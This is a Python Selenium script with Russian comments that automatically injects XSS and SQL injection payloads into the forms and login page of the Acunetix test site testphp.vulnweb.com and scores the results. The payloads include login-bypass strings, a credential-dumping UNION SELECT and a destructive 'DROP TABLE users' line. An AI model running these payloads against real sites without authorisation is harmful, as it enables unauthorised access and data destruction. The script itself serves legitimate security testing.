"""
🛡️ SECURITY TESTING SUITE
Автотест безопасности для проверки XSS и SQL Injection уязвимостей
Тестовый сайт: http://testphp.vulnweb.com (Acunetix Test Site)
"""

import os
import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
import re

# Отключаем SSL проверку
os.environ['WDM_SSL_VERIFY'] = '0'

# Папка для скриншотов
SCREENSHOTS_DIR = "security_test_screenshots"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)


class SecurityTestSuite:
    """Класс для тестирования безопасности веб-приложений"""

    def __init__(self):
        self.driver = None
        self.wait = None
        self.base_url = "http://testphp.vulnweb.com"  # Официальный тестовый сайт Acunetix[248]
        self.test_results = []

        # XSS Payloads для тестирования[234][237][252]
        self.xss_payloads = [
            "<script>alert('XSS_TEST_1')</script>",
            "<img src=x onerror=alert('XSS_TEST_2')>",
            "<svg/onload=alert('XSS_TEST_3')>",
            "<iframe src=javascript:alert('XSS_TEST_4')>",
            "';alert('XSS_TEST_5');//",
            "<script>console.log('XSS_TEST_6')</script>",
            "<body onload=alert('XSS_TEST_7')>",
            "<input onfocus=alert('XSS_TEST_8') autofocus>",
            "javascript:alert('XSS_TEST_9')",
            "<marquee onstart=alert('XSS_TEST_10')>",
        ]

        # SQL Injection Payloads для тестирования[235][238][247]
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT null,null,null--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "admin'--",
            "' OR 1=1 /*",
            "1' OR '1'='1",
            "' AND 1=0 UNION SELECT null, username, password FROM users--"
        ]

    def setup_driver(self):
        """Настройка браузера для тестирования безопасности"""
        options = Options()
        options.add_argument("--start-maximized")
        options.add_argument("--disable-web-security")
        options.add_argument("--allow-running-insecure-content")
        options.add_argument("--disable-xss-auditor")  # Отключаем встроенную защиту от XSS для тестирования[249]
        options.add_argument("--disable-blink-features=AutomationControlled")

        # Логирование консоли для обнаружения XSS
        options.add_experimental_option("detach", True)
        caps = options.to_capabilities()
        caps['goog:loggingPrefs'] = {'browser': 'ALL'}

        try:
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.wait = WebDriverWait(self.driver, 10)

            print("✅ Браузер для security testing запущен")
            return True

        except Exception as e:
            print(f"❌ Ошибка запуска браузера: {e}")
            return False

    def take_screenshot(self, name):
        """Создать скриншот"""
        if self.driver:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"{name}_{timestamp}.png"
            filepath = os.path.join(SCREENSHOTS_DIR, filename)
            self.driver.save_screenshot(filepath)
            print(f"📸 Скриншот безопасности: {filepath}")
            return filepath
        return None

    def check_for_alert(self, expected_text=None):
        """Проверить наличие JavaScript alert (признак успешного XSS)"""
        try:
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            print(f"🚨 ALERT обнаружен: '{alert_text}'")

            if expected_text and expected_text in alert_text:
                print(f"✅ XSS успешно выполнен: найден ожидаемый текст '{expected_text}'")
                self.test_results.append(f"🔥 XSS УЯЗВИМОСТЬ: payload выполнился - {expected_text}")
                alert.accept()
                return True
            else:
                alert.accept()
                return True

        except:
            return False

    def check_console_logs(self):
        """Проверить логи консоли на наличие XSS[240]"""
        try:
            logs = self.driver.get_log('browser')
            xss_detected = False

            for log in logs:
                message = log['message']
                if any(xss_marker in message for xss_marker in ['XSS_TEST_', 'alert', 'console.log']):
                    print(f"🔍 Подозрительная запись в консоли: {message}")
                    xss_detected = True
                    self.test_results.append(f"⚠️ XSS в консоли: {message[:100]}")

            return xss_detected

        except Exception as e:
            print(f"Ошибка проверки логов консоли: {e}")
            return False

    def test_xss_vulnerability(self, url_path="/", form_fields=None):
        """Тестирование XSS уязвимостей"""
        print(f"\n🔍 === ТЕСТИРОВАНИЕ XSS НА {url_path} ===")

        target_url = f"{self.base_url}{url_path}"
        self.driver.get(target_url)
        time.sleep(2)
        self.take_screenshot(f"xss_test_{url_path.replace('/', '_')}_before")

        # Если не указаны конкретные поля, ищем все input поля
        if form_fields is None:
            form_fields = self.driver.find_elements(By.CSS_SELECTOR,
                                                    "input[type='text'], input[type='search'], textarea")

        vulnerabilities_found = 0

        for field in form_fields:
            field_name = field.get_attribute('name') or field.get_attribute('id') or 'unknown_field'
            print(f"\n🎯 Тестируем поле: {field_name}")

            for i, payload in enumerate(self.xss_payloads):
                try:
                    # Очищаем поле и вводим payload
                    field.clear()
                    field.send_keys(payload)

                    # Пытаемся отправить форму
                    submit_buttons = self.driver.find_elements(By.CSS_SELECTOR,
                                                               "input[type='submit'], button[type='submit'], button:contains('Search'), button:contains('Submit')")

                    if submit_buttons:
                        submit_buttons[0].click()
                        time.sleep(1)
                    else:
                        # Если нет кнопки submit, пробуем Enter
                        from selenium.webdriver.common.keys import Keys
                        field.send_keys(Keys.RETURN)
                        time.sleep(1)

                    # Проверяем на alert
                    expected_text = f"XSS_TEST_{i + 1}"
                    if self.check_for_alert(expected_text):
                        vulnerabilities_found += 1
                        self.take_screenshot(f"xss_vulnerability_found_{field_name}_{i}")

                    # Проверяем консольные логи
                    if self.check_console_logs():
                        vulnerabilities_found += 1

                    # Проверяем, отобразился ли payload на странице без экранирования
                    page_source = self.driver.page_source
                    if payload in page_source and "<script>" in payload:
                        print(f"⚠️ Payload отображается на странице без экранирования: {payload[:50]}")
                        self.test_results.append(f"🔥 XSS REFLECTED: {payload[:50]} в поле {field_name}")
                        vulnerabilities_found += 1

                    time.sleep(0.5)  # Небольшая пауза между тестами

                except Exception as e:
                    print(f"Ошибка тестирования XSS с payload {i + 1}: {e}")
                    continue

        if vulnerabilities_found == 0:
            print("✅ XSS уязвимости не обнаружены в данной форме")
            self.test_results.append(f"✅ XSS тест {url_path}: защищено")
        else:
            print(f"🚨 Обнаружено {vulnerabilities_found} потенциальных XSS уязвимостей!")

        self.take_screenshot(f"xss_test_{url_path.replace('/', '_')}_after")
        return vulnerabilities_found

    def test_sql_injection_vulnerability(self, url_path="/", form_fields=None):
        """Тестирование SQL Injection уязвимостей"""
        print(f"\n💉 === ТЕСТИРОВАНИЕ SQL INJECTION НА {url_path} ===")

        target_url = f"{self.base_url}{url_path}"
        self.driver.get(target_url)
        time.sleep(2)
        self.take_screenshot(f"sql_test_{url_path.replace('/', '_')}_before")

        # Ищем поля для ввода
        if form_fields is None:
            form_fields = self.driver.find_elements(By.CSS_SELECTOR,
                                                    "input[type='text'], input[type='password'], input[type='search']")

        vulnerabilities_found = 0

        for field in form_fields:
            field_name = field.get_attribute('name') or field.get_attribute('id') or 'unknown_field'
            print(f"\n🎯 Тестируем SQL injection в поле: {field_name}")

            for i, payload in enumerate(self.sql_payloads):
                try:
                    # Очищаем и вводим SQL payload
                    field.clear()
                    field.send_keys(payload)

                    # Отправляем форму
                    submit_buttons = self.driver.find_elements(By.CSS_SELECTOR,
                                                               "input[type='submit'], button[type='submit'], button")

                    if submit_buttons:
                        submit_buttons[0].click()
                        time.sleep(2)

                    # Анализируем ответ на наличие SQL ошибок
                    page_source = self.driver.page_source.lower()
                    sql_error_indicators = [
                        "mysql_fetch", "sql syntax", "mysqli_", "mysql error",
                        "warning: mysql", "valid mysql result", "mysqlclient",
                        "postgresql", "sqlite", "oracle", "odbc", "jdbc",
                        "sqlstate", "syntax error", "invalid query", "database error"
                    ]

                    for error_indicator in sql_error_indicators:
                        if error_indicator in page_source:
                            print(f"🔥 SQL ERROR обнаружена: '{error_indicator}' с payload: {payload}")
                            self.test_results.append(f"🔥 SQL INJECTION: {error_indicator} - {payload[:50]}")
                            vulnerabilities_found += 1
                            self.take_screenshot(f"sql_error_{field_name}_{i}")
                            break

                    # Проверяем на неожиданное поведение (например, вход без правильных credentials)
                    if "welcome" in page_source or "dashboard" in page_source or "logout" in page_source:
                        if "OR '1'='1" in payload or "OR 1=1" in payload:
                            print(f"⚠️ Возможный SQL Injection bypass: успешный вход с payload {payload}")
                            self.test_results.append(f"🔥 SQL BYPASS: успешный вход - {payload[:50]}")
                            vulnerabilities_found += 1
                            self.take_screenshot(f"sql_bypass_{field_name}_{i}")

                    time.sleep(0.5)

                except Exception as e:
                    print(f"Ошибка тестирования SQL Injection с payload {i + 1}: {e}")
                    continue

        if vulnerabilities_found == 0:
            print("✅ SQL Injection уязвимости не обнаружены")
            self.test_results.append(f"✅ SQL тест {url_path}: защищено")
        else:
            print(f"🚨 Обнаружено {vulnerabilities_found} потенциальных SQL Injection уязвимостей!")

        self.take_screenshot(f"sql_test_{url_path.replace('/', '_')}_after")
        return vulnerabilities_found

    def test_login_security(self):
        """Специальный тест безопасности страницы входа"""
        print("\n🔐 === ТЕСТИРОВАНИЕ БЕЗОПАСНОСТИ ЛОГИНА ===")

        # Ищем страницу входа
        login_paths = ["/login.php", "/admin/", "/login/", "/signin/"]

        for path in login_paths:
            try:
                self.driver.get(f"{self.base_url}{path}")
                time.sleep(2)

                # Ищем поля username и password
                username_field = None
                password_field = None

                try:
                    username_field = self.driver.find_element(By.CSS_SELECTOR,
                                                              "input[name*='user'], input[name*='login'], input[name*='email'], input[type='text']")
                    password_field = self.driver.find_element(By.CSS_SELECTOR,
                                                              "input[name*='pass'], input[type='password']")

                    print(f"✅ Найдена страница входа: {path}")

                    # Тестируем SQL Injection в логин форме
                    print("🔍 Тестирование SQL Injection в форме входа...")

                    dangerous_credentials = [
                        ("admin", "' OR '1'='1"),
                        ("' OR 1=1--", "password"),
                        ("admin'--", "anything"),
                        ("' OR 'a'='a", "' OR 'a'='a"),
                        ("1' OR '1'='1", "1' OR '1'='1")
                    ]

                    for username, password in dangerous_credentials:
                        try:
                            username_field.clear()
                            password_field.clear()

                            username_field.send_keys(username)
                            password_field.send_keys(password)

                            # Ищем кнопку входа
                            login_button = self.driver.find_element(By.CSS_SELECTOR,
                                                                    "input[type='submit'], button[type='submit'], button")
                            login_button.click()

                            time.sleep(2)

                            # Проверяем результат
                            page_source = self.driver.page_source.lower()

                            if any(success_indicator in page_source for success_indicator in
                                   ["welcome", "dashboard", "logout", "profile", "admin panel"]):
                                print(f"🔥 SQL INJECTION УСПЕШЕН! Логин: {username}, Пароль: {password}")
                                self.test_results.append(f"🔥 LOGIN BYPASS: {username} / {password}")
                                self.take_screenshot(f"login_bypass_success")

                            # Проверяем SQL ошибки
                            sql_errors = ["mysql", "sql syntax", "database error", "sqlstate"]
                            if any(error in page_source for error in sql_errors):
                                print(f"⚠️ SQL ошибка при входе с: {username} / {password}")
                                self.test_results.append(f"⚠️ LOGIN SQL ERROR: {username}")
                                self.take_screenshot(f"login_sql_error")

                        except Exception as e:
                            print(f"Ошибка тестирования логина: {e}")
                            continue

                    # Тестируем XSS в полях входа
                    print("🔍 Тестирование XSS в форме входа...")
                    self.test_xss_vulnerability(path, [username_field])

                    break  # Если нашли рабочую страницу входа, выходим из цикла

                except:
                    continue  # Пробуем следующий путь

            except:
                continue

    def test_search_functionality(self):
        """Тестирование функции поиска"""
        print("\n🔍 === ТЕСТИРОВАНИЕ БЕЗОПАСНОСТИ ПОИСКА ===")

        search_paths = ["/search.php", "/", "/index.php", "/search/"]

        for path in search_paths:
            try:
                self.driver.get(f"{self.base_url}{path}")
                time.sleep(2)

                # Ищем поле поиска
                search_fields = self.driver.find_elements(By.CSS_SELECTOR,
                                                          "input[type='search'], input[name*='search'], input[name*='q'], input[placeholder*='search']")

                if search_fields:
                    print(f"✅ Найдена функция поиска на: {path}")

                    # Тестируем XSS в поиске
                    xss_found = self.test_xss_vulnerability(path, search_fields)

                    # Тестируем SQL Injection в поиске
                    sql_found = self.test_sql_injection_vulnerability(path, search_fields)

                    if xss_found > 0 or sql_found > 0:
                        print(f"🚨 Найдены уязвимости в поиске на {path}")

                    break

            except Exception as e:
                print(f"Ошибка тестирования поиска на {path}: {e}")
                continue

    def run_comprehensive_security_test(self):
        """Запуск полного security тестирования"""
        print("🛡️ ЗАПУСК КОМПЛЕКСНОГО SECURITY ТЕСТИРОВАНИЯ")
        print("=" * 60)
        print(f"🎯 Целевой сайт: {self.base_url}")
        print(f"📋 XSS payloads: {len(self.xss_payloads)}")
        print(f"💉 SQL payloads: {len(self.sql_payloads)}")
        print("=" * 60)

        if not self.setup_driver():
            return False

        try:
            # Тестируем главную страницу
            self.driver.get(self.base_url)
            time.sleep(3)
            self.take_screenshot("00_target_site_loaded")

            # Запускаем все тесты безопасности
            self.test_search_functionality()
            self.test_login_security()

            # Тестируем другие возможные страницы
            test_pages = ["/", "/search.php", "/categories.php", "/artists.php"]

            for page in test_pages:
                try:
                    print(f"\n🔍 Тестирование страницы: {page}")
                    self.test_xss_vulnerability(page)
                    self.test_sql_injection_vulnerability(page)
                except Exception as e:
                    print(f"Ошибка на странице {page}: {e}")
                    continue

            # Финальные скриншоты
            self.take_screenshot("99_security_testing_completed")

        except Exception as e:
            print(f"❌ Критическая ошибка security testing: {e}")
            self.take_screenshot("error_critical_security")

        finally:
            self.cleanup()
            self.print_security_report()

    def print_security_report(self):
        """Вывод отчета по безопасности"""
        print("\n" + "=" * 60)
        print("🛡️ ОТЧЕТ ПО БЕЗОПАСНОСТИ")
        print("=" * 60)

        vulnerabilities = [result for result in self.test_results if "🔥" in result]
        warnings = [result for result in self.test_results if "⚠️" in result]
        secure_tests = [result for result in self.test_results if "✅" in result]

        print(f"🔥 КРИТИЧЕСКИЕ УЯЗВИМОСТИ: {len(vulnerabilities)}")
        print(f"⚠️ ПРЕДУПРЕЖДЕНИЯ: {len(warnings)}")
        print(f"✅ ЗАЩИЩЕННЫЕ КОМПОНЕНТЫ: {len(secure_tests)}")
        print(f"📊 ВСЕГО ПРОВЕРОК: {len(self.test_results)}")

        if vulnerabilities:
            print(f"\n🚨 ОБНАРУЖЕНЫ КРИТИЧЕСКИЕ УЯЗВИМОСТИ:")
            for vuln in vulnerabilities:
                print(f"  {vuln}")

        if warnings:
            print(f"\n⚠️ ПРЕДУПРЕЖДЕНИЯ:")
            for warn in warnings:
                print(f"  {warn}")

        if len(vulnerabilities) == 0 and len(warnings) == 0:
            print("\n🎉 ПОЗДРАВЛЯЕМ! Критических уязвимостей не обнаружено.")
            security_score = 100
        else:
            security_score = max(0, 100 - (len(vulnerabilities) * 20) - (len(warnings) * 5))

        print(f"\n📊 ОЦЕНКА БЕЗОПАСНОСТИ: {security_score}/100")

        if security_score >= 90:
            print("🟢 ОТЛИЧНАЯ ЗАЩИТА")
        elif security_score >= 70:
            print("🟡 ХОРОШАЯ ЗАЩИТА")
        elif security_score >= 50:
            print("🟠 СРЕДНЯЯ ЗАЩИТА")
        else:
            print("🔴 СЛАБАЯ ЗАЩИТА - ТРЕБУЕТСЯ ВМЕШАТЕЛЬСТВО!")

        print(f"\n📸 Скриншоты сохранены в: {SCREENSHOTS_DIR}")
        print("=" * 60)

    def cleanup(self):
        """Очистка ресурсов"""
        if self.driver:
            self.driver.quit()
            print("🔒 Браузер безопасности закрыт")


if __name__ == "__main__":
    print("🔐 SECURITY TESTING SUITE v1.0")
    print("Тестирование XSS и SQL Injection уязвимостей")
    print("=" * 50)

    # Запуск тестирования
    security_test = SecurityTestSuite()
    security_test.run_comprehensive_security_test()

    print("\n🎯 Security тестирование завершено!")
    print("Проверьте отчет выше и скриншоты для анализа результатов.")
